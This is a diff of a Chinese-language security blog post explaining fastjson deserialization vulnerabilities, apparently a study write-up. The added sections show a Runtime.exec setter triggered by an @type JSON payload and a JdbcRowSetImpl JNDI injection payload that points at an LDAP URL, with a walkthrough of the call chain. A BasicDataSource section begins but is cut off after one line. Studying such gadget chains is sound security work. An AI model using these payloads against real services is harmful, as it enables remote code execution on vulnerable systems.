@@ -33,8 +33,12 @@
 <meta property="og:image" content="https://gudiffany.github.io/img/image-20240108012629009.png">
 <meta property="og:image" content="https://gudiffany.github.io/img/image-20240108012643867.png">
 <meta property="og:image" content="https://gudiffany.github.io/img/image-20240108013015837.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20240111223654628.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20240111224745282.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20240111224948203.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20240111225345499.png">
 <meta property="article:published_time" content="2023-12-30T12:56:55.000Z">
-<meta property="article:modified_time" content="2024-01-10T04:55:55.733Z">
+<meta property="article:modified_time" content="2024-01-20T14:47:50.431Z">
 <meta property="article:author" content="diffany">
 <meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
@@ -148,7 +152,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">fastjson反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞原理解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">具体调用流程</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">fastjson反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞原理解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">具体调用流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.2.</span> <span class="nav-text">简单利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">具体利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-number">1.2.1.</span> <span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BasicDataSource"><span class="nav-number">1.2.2.</span> <span class="nav-text">BasicDataSource</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -161,18 +165,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-count">40</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-count">20</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -240,7 +244,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-01-10 12:55:55" itemprop="dateModified" datetime="2024-01-10T12:55:55+08:00">2024-01-10</time>
+      <time title="修改时间：2024-01-20 22:47:50" itemprop="dateModified" datetime="2024-01-20T22:47:50+08:00">2024-01-20</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -320,7 +324,25 @@
 <p>get调用栈流程</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:451, FieldInfo (com.alibaba.fastjson.util)</span><br><span class="line">getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSON:902, JSON (com.alibaba.fastjson)</span><br><span class="line">toJSON:824, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:206, JSON (com.alibaba.fastjson)</span><br><span class="line">main:10, test (com.example.fast)</span><br></pre></td></tr></table></figure>
 <p>因此最终的流程如下：</p>
-<p>传入字符串 -&gt; 解析字符串是否存在关键字 -&gt; 进行类的构造，对于方法，参数等进行设置和添加 -&gt; 实例化调用构造方法，set方法 -&gt; 调用get方法</p>
+<p>传入字符串 -&gt; 解析字符串是否存在关键字 -&gt; 进行类的构造，对于方法，参数等进行设置和添加（只会添加public，set和get） -&gt; 实例化调用构造方法，set方法 -&gt; 调用get方法</p>
+<h3 id="简单利用">简单利用</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_command</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fast;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//         关于绕过ASM动态生成类去调试的方法，直接关闭asm，或者使用：</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>); <span class="comment">//调试toJSONString</span></span><br><span class="line">        SerializeConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>); <span class="comment">//调试反序列化函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        1、解析字符串</span></span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject.getString(&quot;param1&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        2、解析固定类</span></span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        Person person = JSON.parseObject(s, Person.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(person.getName());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        3、解析客户端指定的类</span></span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fast.Person\&quot;,\&quot;age\&quot;:\&quot;18\&quot;,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        4、利用set命令执行</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fast.test_command\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="具体利用">具体利用</h2>
+<p>因为fastjson只需要传入参数即可，与原生的反序列化的不同在于入口处是set或者get方法，以及是否成功在于依赖和版本问题（因为反序列化的逻辑由fastjson来控制）</p>
+<h3 id="JdbcRowSetImpl">JdbcRowSetImpl</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/uPaRCLKe\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>具体分析</p>
+<p>就像之前所说的，我们需要寻找到的需要在get或者set方法中寻找可以利用的代码点。</p>
+<p>我们寻找的思路是通过一些危险函数，然后去反向查找方法即可</p>
+<p><img src="/img/image-20240111223654628.png" alt="image-20240111223654628" /></p>
+<p>之后需要选择使用set方法对其进行注入</p>
+<p>通过setAutoCommit -&gt; 调用connect() -&gt; lookup() -&gt; 然后getDataSourceName可控，就可以构造出这条链子了</p>
+<p><img src="/img/image-20240111224745282.png" alt="image-20240111224745282" /></p>
+<p><img src="/img/image-20240111224948203.png" alt="image-20240111224948203" /></p>
+<p><img src="/img/image-20240111225345499.png" alt="image-20240111225345499" /></p>
+<h3 id="BasicDataSource">BasicDataSource</h3>
+<p>对于这条链子，主要解决了不出网的情况</p>
 
     </div>
 
